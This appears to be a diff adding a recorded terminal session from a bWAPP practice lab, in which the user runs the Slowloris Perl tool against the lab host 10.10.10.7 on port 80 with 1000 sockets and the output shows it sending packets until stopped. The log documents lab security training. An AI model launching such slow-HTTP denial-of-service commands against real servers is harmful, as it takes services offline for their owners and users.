@@ -1,0 +1,76 @@
+Script started on 2020-08-18 02:09:10+05:30 [TERM="xterm-256color" TTY="/dev/pts/6" COLUMNS="135" LINES="34"]
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-Slow_HTTP_DoS[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-Slow_HTTP_DoS[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-Slow_HTTP_DoS[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-Slow_HTTP_DoS[00m] $ ls
+01.session             01.session.script  02.session.lck         02.session.script  terminal-log_Tue_18_Aug_2020_02:09:10_AM_IST.dmp
+01.session.data        02.session         02.session.log         [0m[01;34m02.session.tmp[0m
+01.session.properties  02.session.data    02.session.properties  [01;32mslowloris.pl[0m
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-Slow_HTTP_DoS[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-Slow_HTTP_DoS[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-Slow_HTTP_DoS[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-Slow_HTTP_DoS[00m] $ ll
+total 924
+-rw-r--r-- 1 dinesh dinesh     184 Aug 17 13:48 01.session
+-rw-r--r-- 1 dinesh dinesh 1048576 Aug 17 15:02 01.session.data
+-rw-r--r-- 1 dinesh dinesh      99 Aug 17 15:02 01.session.properties
+-rw-r--r-- 1 dinesh dinesh    6971 Aug 17 15:02 01.session.script
+-rw-r--r-- 1 dinesh dinesh     184 Aug 18 02:08 02.session
+-rw-r--r-- 1 dinesh dinesh   49152 Aug 18 02:08 02.session.data
+-rw-r--r-- 1 dinesh dinesh      16 Aug 18 02:10 02.session.lck
+-rw-r--r-- 1 dinesh dinesh   45812 Aug 18 02:08 02.session.log
+-rw-r--r-- 1 dinesh dinesh     100 Aug 18 02:08 02.session.properties
+-rw-r--r-- 1 dinesh dinesh    6754 Aug 18 02:08 02.session.script
+drwxr-xr-x 2 dinesh dinesh    4096 Aug 18 02:08 [0m[01;34m02.session.tmp[0m
+-rwxr-xr-x 1 dinesh dinesh   10605 Aug 18 02:10 [01;32mslowloris.pl[0m
+-rw-r--r-- 1 dinesh dinesh       0 Aug 18 02:09 terminal-log_Tue_18_Aug_2020_02:09:10_AM_IST.dmp
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-Slow_HTTP_DoS[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-Slow_HTTP_DoS[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-Slow_HTTP_DoS[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-Slow_HTTP_DoS[00m] $ ./slowloris.pl 
+Welcome to Slowloris - the low bandwidth, yet greedy and poisonous HTTP client by Laera Loris
+Usage:
+
+	perl ./slowloris.pl -dns [www.example.com] -options
+
+	Type 'perldoc ./slowloris.pl' for help with options.
+
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-Slow_HTTP_DoS[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-Slow_HTTP_DoS[00m] $ ./slowloris.pl  -dns 10.10.10.7
+Welcome to Slowloris - the low bandwidth, yet greedy and poisonous HTTP client by Laera Loris
+Defaulting to port 80.
+Defaulting to a 5 second tcp connection timeout.
+Defaulting to a 100 second re-try timeout.
+Defaulting to 1000 connections.
+Multithreading enabled.
+Connecting to 10.10.10.7:80 every 100 seconds with 1000 sockets:
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Sending data.
+Current stats:	Slowloris has now sent 1124 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 1204 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 1243 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 1300 packets successfully.
+This thread now sleeping for 100 seconds...
+
+^C
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-Slow_HTTP_DoS[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-Slow_HTTP_DoS[00m] $ exit
+
+Script done on 2020-08-18 02:12:00+05:30 [COMMAND_EXIT_CODE="130"]
